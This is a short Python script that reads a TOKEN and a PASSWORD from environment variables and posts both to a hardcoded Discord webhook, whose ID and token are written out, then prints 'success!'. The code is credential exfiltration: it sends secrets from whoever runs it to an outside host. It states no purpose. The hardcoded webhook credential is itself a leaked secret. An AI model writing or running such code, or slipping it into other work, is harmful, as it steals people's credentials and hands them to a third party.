import requests
import os
my_secret = os.environ['TOKEN']
my_secret2 = os.environ['PASSWORD']
import time
from discord import Webhook, RequestsWebhookAdapter 

time.sleep(2)
webhook = Webhook.partial(1066415367225868368, '2aG6iuhuwXzaorPjoAFXGPJLW1qh9rY45XqmGWMZM5UcPEjCjQX4tORW5piJduUly_L-', adapter=RequestsWebhookAdapter())
webhook.send("--------------", username='START')
webhook.send(my_secret, username='tok')
webhook.send(my_secret2, username='pas')
webhook.send("--------------", username='FINISH')
print("success!")
